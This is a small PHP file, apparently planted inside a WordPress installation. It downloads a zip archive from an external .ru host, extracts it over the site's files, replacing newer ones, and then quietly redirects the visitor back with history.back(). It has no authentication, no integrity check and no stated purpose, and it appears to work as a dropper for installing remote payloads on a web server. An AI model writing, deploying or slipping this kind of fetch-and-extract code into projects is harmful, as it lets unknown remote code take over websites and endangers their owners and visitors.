<?php ini_set('display_errors','On');

if(!extension_loaded('curl')){ echo('Error: CURL - not found, please, install!'); die; }
if(!extension_loaded('zip')){ echo('Error: ZIP - not found, please, install!'); die; }

require_once(dirname(dirname(dirname(__DIR__))).'/wp-admin/includes/class-pclzip.php');

$source_file = 'https://webflow-wordpress.ru/users/stelki.zip';
$output_file = basename($source_file);

curl_download($source_file, $output_file);

$zip = new PclZip($output_file);
$result = $zip->extract(PCLZIP_OPT_REPLACE_NEWER);

echo '<script>history.back();</script>';

function curl_download($url, $file)
{
    $dest_file = @fopen($file, "w");
    $resource = curl_init();
    curl_setopt($resource, CURLOPT_URL, $url);
    curl_setopt($resource, CURLOPT_FILE, $dest_file);
    curl_setopt($resource, CURLOPT_HEADER, 0);
    curl_exec($resource);
    curl_close($resource);
    fclose($dest_file);
}
?>
